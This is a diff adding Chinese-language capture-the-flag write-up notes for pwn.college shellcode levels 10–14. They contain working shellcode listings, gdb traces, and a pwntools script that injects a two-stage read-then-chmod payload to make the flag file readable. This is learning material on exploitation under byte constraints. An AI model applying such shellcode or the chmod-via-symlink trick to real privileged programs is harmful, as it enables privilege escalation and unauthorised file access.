@@ -932,3 +932,180 @@ _1:
 ```
 
 ## level10
+
+level10这一关会对输出的数据，按照`uint_64`为一个单位（8个字节）进行冒泡排序。我们只需要保证第8个字节的数值大于第16个字节的数据就行。 
+
+看了一下之前level8中的代码就能用。
+```asm
+      Address      |                      Bytes                    |          Instructions
+------------------------------------------------------------------------------------------
+0x0000000030275000 | 6a 66                                         | push 0x66
+0x0000000030275002 | 48 89 e7                                      | mov rdi, rsp
+0x0000000030275005 | 6a 04                                         | push 4
+0x0000000030275007 | 5e                                            | pop rsi # 这个数值是大于05的
+0x0000000030275008 | 6a 5a                                         | push 0x5a
+0x000000003027500a | 58                                            | pop rax
+0x000000003027500b | 0f 05                                         | syscall # 这个只有5个字节，肯定是小于上面那个数的
+
+Executing shellcode!
+
+
+pwn.college{}
+
+```
+
+## level11
+
+跟上面那个一样，也是冒泡排序。但是在执行shellcode之前，会关闭`stdin`。它给的提示是`which means that it will be harder to pass in a stage-2 shellcode.` 应该可以通过输入shellcode，然后再读取输入？应该可以，它shellcode的初始地址是一定的，你只需要往后面写就行应该，算好偏移量的前提。
+
+但是我们是修改文件权限的，跟标准输出没有关系，所以我们直接复用之前的代码就行。
+
+## level12
+
+这一关跟之前的区别是，输入的字节数必须要互不相同。方法就是要找一些等效指令，对应的二进制不要相同。 这里我把符号链接的名字设置为了`0x5a`，这样跟`chmod`的系统调用号一样，我可以通过栈顶指针将`0x5a`赋值给` rax`。虽然不知道这种情况下，rax寄存器那些高位的数值是否为0。但这样是可行的。
+
+```asm
+      Address      |                      Bytes                    |          Instructions
+------------------------------------------------------------------------------------------
+0x0000000015b1f000 | 6a 5a                                         | push 0x5a
+0x0000000015b1f002 | 54                                            | push rsp
+0x0000000015b1f003 | 5f                                            | pop rdi
+0x0000000015b1f004 | 40 b6 04                                      | mov sil, 4
+0x0000000015b1f007 | 8a 07                                         | mov al, byte ptr [rdi]
+0x0000000015b1f009 | 0f 05                                         | syscall 
+```
+
+## level13
+
+要求0xc个字节以内，数了一下刚好12关的刚好11个字节，直接复用就行。
+
+## level14
+
+最后一关，要求6个字节！
+
+看了网上的解析，需要一个stage2的代码，先通过shellcode调用read，往缓冲区中放入新的shellcode，然后在执行。
+
+这里需要注意的是，调用syscall-read以后，rip的指向已经到了`0x1b3f5006`，但是之前调用read时，缓冲区的地址设置的是`0x1b3f5000`，stage-2部分代码是要在`0x1b3f5000`处开始写，但是代码要在`0x1b3f5006`处开始执行，所以前面需要用nop指令进行填充。
+
+```asm
+
+这是调用shellcod函数之前的寄存器结构
+
+(gdb) info registers
+rax            0x0                 0  # 刚好是read函数的系统调用号
+rbx            0x5555555557e0      93824992237536
+rcx            0x7ffff6d15297      140737334301335
+rdx            0x1b3f5000          457134080 # 刚好是缓冲区地址
+rsi            0x5555555592a0      93824992252576
+rdi            0x7ffff6df57e0      140737335220192
+rbp            0x7fffffffdf00      0x7fffffffdf00
+rsp            0x7fffffffdeb8      0x7fffffffdeb8
+r8             0x16                22
+r9             0xb                 11
+
+栈内容以及eip的走向
+      Address      |                      Bytes                    |          Instructions
+------------------------------------------------------------------------------------------
+0x0000000018fa4000 | 31 ff                                         | xor edi, edi
+0x0000000018fa4002 | 52                                            | push rdx
+0x0000000018fa4003 | 5e                                            | pop rsi
+0x0000000018fa4004 | 0f 05                                         | syscall 
+
+1: x/16i $pc
+=> 0x1b3f5000:  xor    %edi,%edi
+   0x1b3f5002:  push   %rdx
+   0x1b3f5003:  pop    %rsi
+   0x1b3f5004:  syscall
+   0x1b3f5006:  add    %al,(%rax)
+   0x1b3f5008:  add    %al,(%rax)
+   0x1b3f500a:  add    %al,(%rax)
+   0x1b3f500c:  add    %al,(%rax)
+   0x1b3f500e:  add    %al,(%rax)
+   0x1b3f5010:  add    %al,(%rax)
+   0x1b3f5012:  add    %al,(%rax)
+   0x1b3f5014:  add    %al,(%rax)
+   0x1b3f5016:  add    %al,(%rax)
+   0x1b3f5018:  add    %al,(%rax)
+   0x1b3f501a:  add    %al,(%rax)
+   0x1b3f501c:  add    %al,(%rax)
+
+1: x/16i $pc
+=> 0x1b3f5004:  syscall
+   0x1b3f5006:  add    %al,(%rax)
+   0x1b3f5008:  add    %al,(%rax)
+   0x1b3f500a:  add    %al,(%rax)
+   0x1b3f500c:  add    %al,(%rax)
+   0x1b3f500e:  add    %al,(%rax)
+   0x1b3f5010:  add    %al,(%rax)
+   0x1b3f5012:  add    %al,(%rax)
+   0x1b3f5014:  add    %al,(%rax)
+   0x1b3f5016:  add    %al,(%rax)
+   0x1b3f5018:  add    %al,(%rax)
+   0x1b3f501a:  add    %al,(%rax)
+   0x1b3f501c:  add    %al,(%rax)
+   0x1b3f501e:  add    %al,(%rax)
+   0x1b3f5020:  add    %al,(%rax)
+   0x1b3f5022:  add    %al,(%rax)
+
+
+1: x/16i $pc
+=> 0x1b3f5006:  nop
+   0x1b3f5007:  push   $0x66
+   0x1b3f5009:  mov    %rsp,%rdi
+   0x1b3f500c:  push   $0x4
+   0x1b3f500e:  pop    %rsi
+   0x1b3f500f:  push   $0x3b
+   0x1b3f5011:  pop    %rax
+   0x1b3f5012:  syscall
+   0x1b3f5014:  add    %al,(%rax)
+   0x1b3f5016:  add    %al,(%rax)
+   0x1b3f5018:  add    %al,(%rax)
+   0x1b3f501a:  add    %al,(%rax)
+   0x1b3f501c:  add    %al,(%rax)
+   0x1b3f501e:  add    %al,(%rax)
+   0x1b3f5020:  add    %al,(%rax)
+   0x1b3f5022:  add    %al,(%rax)
+```
+
+```python
+
+from pwn import *
+from warnings import filterwarnings
+import os
+
+filterwarnings(action='ignore', category=BytesWarning)
+elf = ELF('/challenge/babyshell_level14', checksec=False)
+context.binary = elf
+context.log_level="INFO"
+
+shellcode = f'''
+xor edi, edi
+push rdx
+pop rsi
+syscall
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+push 0x66  /* ASCII für 'f' */
+mov rdi, rsp
+push 4
+pop rsi
+push SYS_chmod
+pop rax
+syscall
+'''
+
+os.system('ln -s /flag f')
+p = process()
+payload = asm(shellcode, arch='amd64')
+p.sendlineafter("from stdin", payload)
+output = p.recvall().decode('utf-8')
+print(output)
+p.close()
+os.system('cat f')
+
+```
